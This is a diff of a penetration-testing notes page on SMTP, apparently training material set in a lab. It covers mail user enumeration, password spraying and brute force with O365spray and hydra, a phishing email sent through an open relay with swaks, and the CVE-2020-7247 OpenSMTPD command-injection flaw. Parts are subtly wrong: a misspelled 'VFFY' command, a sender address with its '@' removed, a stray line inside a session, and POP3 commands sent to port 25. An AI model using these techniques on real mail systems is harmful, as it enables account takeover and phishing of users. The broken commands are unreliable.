@@ -10,8 +10,10 @@ tags:
   - SMTP
   - Simple Mail Transfer Protocol
 ---
-
 # Ports 25, 565, 587 - Simple Mail Tranfer Protocol (SMTP)
+
+!!! tip "Related resources"
+	- [POP3/IMAP4 protocol](110-143-993-995-imap-pop3.md)
 
 
 The Simple Mail Transfer Protocol (SMTP) is a protocol for sending emails in an IP network. By default, SMTP servers accept connection requests on port 25. However, newer SMTP servers also use other ports such as TCP port 587. This port is used to receive mail from authenticated users/servers, usually using the STARTTLS command. SMTP works unencrypted without further measures and transmits all commands, data, or authentication information in plain text. To prevent unauthorized reading of data, the SMTP is used in conjunction with SSL/TLS encryption. Under certain circumstances, a server uses a port other than the standard TCP port 25 for the encrypted connection, for example, TCP port 465.
@@ -21,11 +23,10 @@ The Simple Mail Transfer Protocol (SMTP) is a protocol for sending emails in an 
 
 `Mail User Agent` (`MUA`): SMTP client who sends the email. MUA converts it into a  header and a body and uploads both to the SMTP server. 
 
-`Mail Submission Agent` (`MSA`), which checks the validity, i.e., the origin of the e-mail. This `MSA` is also called `Relay` server. These are very important later on, as the so-called `Open Relay Attack`.
+`Mail Submission Agent` (`MSA`), which checks the validity, i.e., the origin of the e-mail. This `MSA` is also called `Relay` server. These are very important later on, as the so-called `Open Relay Attack`. Proxy that occasionally precedes the MTA to relieve the load. It checks the validity, i.e., the origin of the e-mail. This `MSA` is also called `Relay` server.  
+
 
 `Mail Transfer Agent` (`MTA`):  The MTA checks the e-mail for size and spam and then stores it. At this point of the process, this MTA works as the sender's server. The MTA then searches the DNS for the IP address of the recipient mail server. On arrival at the destination SMTP server, the receiver's MTA reassembles the data packets to form a complete e-mail.
-
-`Mail Submission Agent` (`MSA`): Proxy that occasionally precedes the MTA to relieve the load. It checks the validity, i.e., the origin of the e-mail. This `MSA` is also called `Relay` server.  
 
 `Mail delivery agent` (`MDA`): It deals with transferring the email to the recipient's mailbox.
 
@@ -44,8 +45,8 @@ Extended SMTP (ESMTP) deals with the main two shortcomings of SMTP protocol:
 
 For this, ESMTP uses TLS for encryption and [AUTH PLAIN](https://www.samlogic.net/articles/smtp-commands-reference-auth.htm) extension for authentication. See also [Postfix](postfix.md)
 
-## Basic commands
 
+## Basic commands
 
 ```shell-session
 # We can use telnet protocol to connect to a SMTP server
@@ -113,7 +114,7 @@ EHLO inlanefreight.htb
 # 250-SMTPUTF8 
 # 250 CHUNKING   
 
-MAIL FROM: <cry0l1t3@inlanefreight.htb>  
+MAIL FROM: <cry0l1t3inlanefreight.htb>  
 # 250 2.1.0 Ok   
 
 RCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure  
@@ -148,7 +149,123 @@ sudo nmap $ip -sC -sV -p25
 sudo nmap $ip -p25 --script smtp-open-relay -v
 ```
 
-**Scripts for user enumeration**:
+| **Port**  | **Service**                                                                |
+| --------- | -------------------------------------------------------------------------- |
+| `TCP/25`  | SMTP Unencrypted                                                           |
+| `TCP/143` | IMAP4 Unencrypted                                                          |
+| `TCP/110` | POP3 Unencrypted                                                           |
+| `TCP/465` | SMTP Encrypted                                                             |
+| `TCP/587` | SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS) |
+| `TCP/993` | IMAP4 Encrypted                                                            |
+| `TCP/995` | POP3 Encrypted                                                             |
+
+
+## Enumeration
+
+When it comes to enumeration it is critical to understand if we are facing a cloud service or a custom mail server implementation. 
+
+
+### Custom mail server implementation
+
+We will focus on typical misconfigurations
+
+#### User enumeration with commands
+
+The SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password.
+##### VRFY 
+
+First we try to connect to the server:
+
+```bash
+telnet $ip 25
+```
+
+If anonymous login is enabled, we are in. Otherwise we could try to login, for instance with user `root`:
+
+```
+VFFY root
+```
+
+The code 252 in the answer means that the user exists. The code 550 means that it is an unknown user. 
+
+##### EXPN 
+
+`EXPN` is similar to `VRFY`, except that when used with a distribution list. 
+First we try to connect to the server:
+
+```bash
+telnet $ip 25
+```
+
+Then we try to list all users on that distribution list with EXPN:
+
+```shell-session
+EXPN support-team
+```
+
+A typical response could be:
+
+```shell-session
+250 2.0.0 carol@inlanefreight.htb
+250 2.1.5 elisa@inlanefreight.htb
+```
+
+##### RCPT TO Command
+
+`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.
+
+First we try to connect to the server:
+
+```bash
+telnet $ip 25
+```
+
+Then we attempt the `RCPT TO` command:
+
+```shell-session
+MAIL FROM:test@htb.com
+it is
+250 2.1.0 test@htb.com... Sender ok
+
+
+RCPT TO:julio
+
+550 5.1.1 julio... User unknown
+
+
+RCPT TO:kate
+
+550 5.1.1 kate... User unknown
+
+
+RCPT TO:john
+
+250 2.1.5 john... Recipient ok
+```
+
+##### USER
+
+We can also use the `POP3` protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exists on the server. First we try to connect to the server:
+
+```bash
+telnet $ip 25
+```
+
+Then we attempt the `USER` command:
+
+```shell-session
+USER julio
+-ERR
+
+
+USER john
++OK
+```
+
+
+#### User enumeration with commands
+
+A way to automate this enumeration is this **script for user enumeration**:
 
 ```bash
 # Enumerate users:
@@ -173,7 +290,110 @@ Results from script in user enumeration:
 252 2.0.0 robin                 
 ```
 
+#### smtp-user-enum
 
+Username guessing tool primarily for use against the default Solaris SMTP service. Can use either EXPN, VRFY or RCPT TO.
+
+Repo: [https://github.com/pentestmonkey/smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)
+
+Basic usage:
+
+```shell-session
+smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t $ip
+# -M: Enumeration mode, it can be `VRFY`, `EXPN`, or `RCPT`
+# -U: file with list of users
+# -D: domain
+# -t: target
+```
+
+
+### Cloud mail server implementation
+
+#### Enumerating users in Microsoft Office 365 (O365)
+
+##### O365spray
+
+[O365spray](o365spray.md) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365). This tool reimplements a collection of enumeration and spray techniques.
+
+```
+sudo pip install -r requirements.txt
+```
+
+Basic usage:
+
+```shell-session
+# First validate if our target domain is using Office 365.
+python3 o365spray.py --validate --domain msexample.com
+
+# Attempt to identify usernames.
+python3 o365spray.py --enum -U users.txt --domain msexample.com
+
+```
+
+
+## Password Attacks
+
+### Custom mail servers
+#### hydra
+
+```shell-session
+# Attacking a pop3 service
+hydra -L users.txt -p 'Company01!' -f $ip pop3
+
+hydra -l user@inlanefreight.htb -P passwords.list -t 64 -f $ip smtp
+```
+
+
+### Cloud mail services
+
+If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like `Hydra`, but these tools are usually blocked.
+
+#### MSOffice 365
+
+##### O365spray
+
+See [O365spray](o365spray.md)
+
+```shell-session
+# First validate if our target domain is using Office 365.
+python3 o365spray.py --validate --domain msexample.com
+
+# Password spraying technique 
+python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msexample.com
+```
+
+##### MailSniper
+
+See [MailSniper](mailsniper.md)
+
+#### Gmail and Okta
+
+ [CredKing](https://github.com/ustayready/CredKing)
+
+## Open relay attack
+
+An open relay is a Simple Mail Transfer Protocol (`SMTP`) server, which is improperly configured and allows an unauthenticated email relay.
+
+First, identify if an SMTP port allows an open relay:
+
+```shell-session
+nmap -p25 -Pn --script smtp-open-relay $ip
+```
+
+Next, we can use any mail client to connect to the mail server and send our email.
+
+```shell-session
+swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server $ipSMTPServerVictim
+```
+
+See [swaks](swaks.md).
+
+## Attacks on SMTPD
+
+**Affected version**:  [OpenSMTPD](https://www.opensmtpd.org/) up to version 6.6.2
+**Vulnerability**: [CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247) and leads to RCE.
+
+The vulnerability in this service lies in the program's code, namely in the function that records the sender's email address. This offers the possibility of escaping the function using a semicolon (`;`) and making the system execute arbitrary shell commands. However, there is a limit of 64 characters, which can be inserted as a command. The technical details of this vulnerability can be found [here](https://www.openwall.com/lists/oss-security/2020/01/28/3). Exploit [here](https://www.exploit-db.com/exploits/47984)
 
 ## Postfix, an example of a SMTP server
 
